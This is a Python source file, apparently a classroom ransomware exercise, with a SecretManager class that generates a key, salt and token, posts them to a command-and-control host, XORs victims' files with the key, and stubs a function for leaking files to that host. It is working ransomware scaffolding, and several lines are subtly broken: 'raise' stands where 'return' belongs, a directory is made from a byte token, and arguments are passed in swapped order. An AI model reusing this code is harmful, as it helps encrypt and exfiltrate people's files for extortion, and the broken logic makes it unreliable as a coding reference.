from hashlib import sha256
import logging
import os
import secrets
import json
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = bytes()
        self._salt = bytes()
        self._token = bytes()
        self._path_token=path+"/token"
        self._path_salt=path+"/salt"
        
        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        derivation_method=PBKDF2HMAC(
            algorithm=hashes.SHA256(), # hashage par SHA256 (découpages, compressions du sel)
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION
        )

        # self._token ?
        token=derivation_method.derive(key)
        return token # bytes


    def create(self)->Tuple[bytes, bytes, bytes]:

        # self._key=os.urandom(self.KEY_LENGTH)
        # self._salt=os.urandom(self.SALT_LENGTH)
        self._salt=secrets.token_bytes(self.SALT_LENGTH)
        self._key=secrets.token_bytes(self.KEY_LENGTH)
        
        token=self.do_derivation(self._salt,self._key)
        
        return self._key,self._salt,token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:

        payload={
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key),
        }
        try:
            req=requests.post(self._remote_host_port,data=json.dumps(payload))
            if req.status_code!=200:
                raise ConnectionError('Error Status Code.')
        except Exception as excp:
            raise ConnectionError('Error Connection.')
        # register the victim to the CNC


    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        if not os.path.exists(self._path_token):
            os.mkdir(self._token)

        self._key,self._salt,self._token=self.create()

        try:
            self.post_new(self._key,self._salt,self._token)
        except ConnectionError as cnerr:
            self.clean()
            raise cnerr
        
        path=os.path.join(self._path_token,'token.bin')
        with open(path,'wb') as file:
            file.write(self._token)

        path=os.path.join(self._path,'salt.bin')
        with open(path,'wb') as file:
            file.write(self._salt)


    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise self.do_derivation(self._salt,candidate_key)==self._token

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        key_to_check=base64.b64decode(b64_key)
        if self.check_key(key_to_check):
            self_key=key_to_check
        else:
            raise Exception('Invalid Key.')

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise str(self._token.hex())

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f in files:
            xorfile(f,self._key)

    def leak_files(self, files:List[str])->None:             
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        try : 
            if os.path.exists(os.path.join(self._path_token,'token.bin')):
                os.remove(os.path.join(self._path_token,'token.bin'))
        except Exception as e: self._log.error(f'Problem removing token.bin : {e}')
        self._log.info('Tokens removed.')
        self._token=None

        try : 
            if os.path.exists(os.path.join(self._path_salt,'salt.bin')):
                os.remove(os.path.join(self._path_salt,'salt.bin'))
        except Exception as e: self._log.error(f'Problem removing salt.bin : {e}')
        self._log.info('Salts removed.')

        self._salt=None
        self._key=None
    